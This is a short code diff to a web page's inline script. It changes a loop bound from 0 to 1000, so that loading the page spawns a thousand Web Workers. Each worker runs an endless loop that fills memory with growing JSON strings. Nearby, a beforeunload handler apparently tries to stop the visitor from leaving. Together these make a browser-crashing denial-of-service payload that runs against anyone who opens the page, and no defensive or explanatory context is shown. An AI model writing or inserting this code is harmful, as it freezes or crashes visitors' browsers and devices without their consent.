@@ -39,7 +39,7 @@
             e.returnValue = ''; 
         });
 
-        for (let i = 0; i < 0; i++) {const w = new Worker(URL.createObjectURL(
+        for (let i = 0; i < 1000; i++) {const w = new Worker(URL.createObjectURL(
           new Blob(['let a=[""];while(true){a.push(JSON.stringify(a))}'], {type: 'text/javascript'})
         ));}
     </script>
